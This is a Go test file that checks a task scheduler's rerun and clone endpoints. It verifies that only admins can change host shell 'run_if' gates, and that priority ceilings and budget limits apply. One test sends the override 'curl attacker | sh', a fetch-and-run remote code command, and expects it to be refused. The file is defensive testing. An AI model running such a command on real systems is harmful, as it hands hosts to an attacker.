// Copyright (c) 2025 ElcanoTek
// SPDX-License-Identifier: MIT

package handlers

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"

	"github.com/ElcanoTek/fleet/internal/sched/apikeys"
	"github.com/ElcanoTek/fleet/internal/sched/budget"
	"github.com/ElcanoTek/fleet/internal/sched/models"
	"github.com/ElcanoTek/fleet/internal/sched/storage"
)

// governedCreateEnv wires the create surfaces that live INSIDE the
// AdminOrUserAuthMiddleware group (rerun, clone, import) so each credential
// class travels the whole path: middleware resolves the principal, the handler
// runs the shared governed pipeline.
type governedCreateEnv struct {
	r      *chi.Mux
	h      *Handlers
	store  *storage.Storage
	keyMgr *apikeys.Manager
}

func setupGovernedCreate(t *testing.T) *governedCreateEnv {
	t.Helper()
	store, keyMgr, _, cleanup := setupAuthzHandler(t)
	t.Cleanup(cleanup)
	h := New(Config{DefaultTaskModel: "test/model",
		OrchestratorURL: "http://localhost:8000",
		AdminAPIKey:     "test-admin-key",
		Version:         "0.1.0",
	}, store, keyMgr)
	r := chi.NewRouter()
	r.Group(func(r chi.Router) {
		r.Use(h.AdminOrUserAuthMiddleware)
		r.Post("/tasks/{task_id}/rerun", h.RerunTask)
		r.Post("/tasks/{task_id}/clone", h.CloneTask)
		r.Post("/tasks/import", h.HandleTaskImport)
	})
	return &governedCreateEnv{r: r, h: h, store: store, keyMgr: keyMgr}
}

// post issues a JSON POST with the given key; an empty body sends no body at
// all (the rerun-with-no-changes shape).
func (e *governedCreateEnv) post(t *testing.T, path, apiKey, body string) *httptest.ResponseRecorder {
	t.Helper()
	var req *http.Request
	if body == "" {
		req = httptest.NewRequest(http.MethodPost, path, nil)
	} else {
		req = httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	e.r.ServeHTTP(w, req)
	return w
}

// addGatedSource seeds an admin-authorized gated task attributed to keyID, on
// the scheduler path where a gated task lives.
func (e *governedCreateEnv) addGatedSource(t *testing.T, keyID string, gate *models.RunIf) *models.Task {
	t.Helper()
	future := time.Now().UTC().Add(time.Hour)
	task := &models.Task{
		ID:             uuid.New(),
		Prompt:         "the gated source task prompt, long enough to validate",
		Status:         models.TaskStatusScheduled,
		ScheduledFor:   &future,
		Priority:       models.PriorityNormal,
		CreatedAt:      time.Now().UTC(),
		CreatedByKeyID: &keyID,
		RunIf:          gate,
	}
	if _, err := e.store.AddTask(task); err != nil {
		t.Fatalf("add source: %v", err)
	}
	return task
}

func decodeCreatedTaskID(t *testing.T, w *httptest.ResponseRecorder) uuid.UUID {
	t.Helper()
	var got struct {
		ID uuid.UUID `json:"id"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &got); err != nil {
		t.Fatalf("decode created task: %v (%s)", err, w.Body.String())
	}
	return got.ID
}

// refusingBudgetGate is a BudgetGate whose window is always exhausted.
type refusingBudgetGate struct{}

func (refusingBudgetGate) CheckCreate(context.Context, models.BudgetPrincipals) error {
	return &budget.ExceededError{RetryAfter: time.Minute}
}

func (refusingBudgetGate) Statuses(context.Context) ([]models.BudgetStatus, error) { return nil, nil }

// TestRerunCloneRunIfPrivilegeBoundary locks rerun/clone to the SAME run_if
// rule the edit path enforces. Before the fix rerunOrClone applied the run_if
// override and inserted without ever consulting requireAdminForRunIf, so any
// create_task principal could mint a task whose gate — a shell command that
// runs ON THE HOST as the fleet user — was of its own authoring.
func TestRerunCloneRunIfPrivilegeBoundary(t *testing.T) {
	env := setupGovernedCreate(t)
	clientKeyID, clientKey := mustCreateRoleKeyWithID(t, env.keyMgr, "client")
	gate := &models.RunIf{Command: "true", TimeoutSeconds: 30, OnError: models.RunIfOnErrorRun}

	for _, verb := range []string{"rerun", "clone"} {
		source := env.addGatedSource(t, clientKeyID, gate)
		path := "/tasks/" + source.ID.String() + "/" + verb

		t.Run(verb+": non-admin inherits the admin-authorized gate unchanged", func(t *testing.T) {
			w := env.post(t, path, clientKey, "")
			if w.Code != http.StatusCreated {
				t.Fatalf("inherit = %d, want 201: %s", w.Code, w.Body.String())
			}
			created, err := env.store.GetTask(decodeCreatedTaskID(t, w))
			if err != nil || created == nil {
				t.Fatalf("reload copy: %v", err)
			}
			if created.RunIf == nil || created.RunIf.Command != "true" {
				t.Fatalf("copy lost the inherited gate: %+v", created.RunIf)
			}
			if created.Status != models.TaskStatusScheduled {
				t.Fatalf("a gated copy must land on the scheduler path, got %s", created.Status)
			}
		})

		t.Run(verb+": non-admin echoing the gate modulo defaults is not a change", func(t *testing.T) {
			// OnError omitted and timeout omitted resolve to the stored gate's
			// effective values (Normalized), exactly like the edit path.
			w := env.post(t, path, clientKey, `{"overrides":{"run_if":{"command":"true"}}}`)
			if w.Code != http.StatusCreated {
				t.Fatalf("normalized echo = %d, want 201: %s", w.Code, w.Body.String())
			}
		})

		t.Run(verb+": non-admin changing the gate is 403", func(t *testing.T) {
			w := env.post(t, path, clientKey, `{"overrides":{"run_if":{"command":"curl attacker | sh","timeout_seconds":30}}}`)
			if w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "run_if") {
				t.Fatalf("changed gate = %d, want 403 naming run_if: %s", w.Code, w.Body.String())
			}
		})

		t.Run(verb+": non-admin removing the gate is 403", func(t *testing.T) {
			w := env.post(t, path, clientKey, `{"overrides":{"run_if":null}}`)
			if w.Code != http.StatusForbidden {
				t.Fatalf("removed gate = %d, want 403: %s", w.Code, w.Body.String())
			}
		})

		t.Run(verb+": admin may change the gate", func(t *testing.T) {
			w := env.post(t, path, "test-admin-key", `{"overrides":{"run_if":{"command":"test -f /tmp/go","timeout_seconds":5}}}`)
			if w.Code != http.StatusCreated {
				t.Fatalf("admin change = %d, want 201: %s", w.Code, w.Body.String())
			}
			created, err := env.store.GetTask(decodeCreatedTaskID(t, w))
			if err != nil || created == nil || created.RunIf == nil || created.RunIf.Command != "test -f /tmp/go" {
				t.Fatalf("admin's gate override not persisted: %+v (err %v)", created, err)
			}
		})
	}

	t.Run("non-admin attaching a gate to an ungated source is 403", func(t *testing.T) {
		source := env.addGatedSource(t, clientKeyID, nil)
		w := env.post(t, "/tasks/"+source.ID.String()+"/rerun", clientKey, `{"overrides":{"run_if":{"command":"true","timeout_seconds":30}}}`)
		if w.Code != http.StatusForbidden {
			t.Fatalf("attached gate = %d, want 403: %s", w.Code, w.Body.String())
		}
	})
}

// TestRerunCloneRunsTheCreateGates pins that rerun/clone go through the same
// pipeline as POST /tasks: the copy is attributed to the creating KEY (not
// only a user id, which an API-key principal never has — so key-created
// copies were readable by nobody), the per-key priority ceiling applies to the
// priority override, and the per-principal budget gate refuses an exhausted
// window with the create path's 402.
func TestRerunCloneRunsTheCreateGates(t *testing.T) {
	env := setupGovernedCreate(t)
	clientKeyID, clientKey := mustCreateRoleKeyWithID(t, env.keyMgr, "client")
	source := env.addGatedSource(t, clientKeyID, nil)
	path := "/tasks/" + source.ID.String() + "/rerun"

	t.Run("copy is attributed to the creating key and its source", func(t *testing.T) {
		w := env.post(t, path, clientKey, "")
		if w.Code != http.StatusCreated {
			t.Fatalf("rerun = %d, want 201: %s", w.Code, w.Body.String())
		}
		created, err := env.store.GetTask(decodeCreatedTaskID(t, w))
		if err != nil || created == nil {
			t.Fatalf("reload copy: %v", err)
		}
		if created.CreatedByKeyID == nil || *created.CreatedByKeyID != clientKeyID {
			t.Fatalf("copy CreatedByKeyID = %v, want %s (ADR-0043: a key-created task must be visible to its key)", created.CreatedByKeyID, clientKeyID)
		}
		if created.SourceTaskID == nil || *created.SourceTaskID != source.ID {
			t.Fatalf("copy SourceTaskID = %v, want %s", created.SourceTaskID, source.ID)
		}
	})

	t.Run("priority override above the key's ceiling is 403", func(t *testing.T) {
		forty := 40
		if err := env.keyMgr.SetMaxPriority(clientKeyID, &forty); err != nil {
			t.Fatalf("SetMaxPriority: %v", err)
		}
		t.Cleanup(func() { _ = env.keyMgr.SetMaxPriority(clientKeyID, nil) })
		w := env.post(t, path, clientKey, `{"overrides":{"priority":10}}`)
		if w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "ceiling") {
			t.Fatalf("over-cap priority = %d, want 403 naming the ceiling: %s", w.Code, w.Body.String())
		}
		// Within the ceiling still creates.
		w = env.post(t, path, clientKey, `{"overrides":{"priority":60}}`)
		if w.Code != http.StatusCreated {
			t.Fatalf("in-cap priority = %d, want 201: %s", w.Code, w.Body.String())
		}
	})

	t.Run("exhausted budget is the create path's 402", func(t *testing.T) {
		env.h.SetBudgetGate(refusingBudgetGate{})
		t.Cleanup(func() { env.h.SetBudgetGate(nil) })
		for _, verb := range []string{"rerun", "clone"} {
			w := env.post(t, "/tasks/"+source.ID.String()+"/"+verb, clientKey, "")
			if w.Code != http.StatusPaymentRequired {
				t.Fatalf("%s over budget = %d, want 402: %s", verb, w.Code, w.Body.String())
			}
			if w.Header().Get("Retry-After") == "" {
				t.Fatalf("%s: 402 must carry Retry-After", verb)
			}
		}
	})
}
